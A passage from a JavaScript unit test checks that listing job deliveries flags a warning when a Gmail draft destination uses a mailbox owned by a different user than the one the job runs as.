  sb.tables.revboxes[0].delivery = [{ id: 'd1', kind: 'gmail', target: 'conn-dana', to: 'vp@x.example' }];
  const mailboxes = async () => [{ id: 'conn-dana', email: 'dana@acme.example', owner_user_id: 'dana' }];
  const { job_deliveries } = await listRevboxJobDeliveries(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', mailboxes });
  const warns = job_deliveries.filter(d => d.kind === 'warning');
  assert.deepEqual(warns.map(w => [w.job_id, w.destination_id, w.target]), [['r1', 'd1', 'd1']]);
  assert.equal(warns[0].label, 'dana@acme.example belongs to Dana; drafts from "Daily" will fail while it runs as someone else.');
});
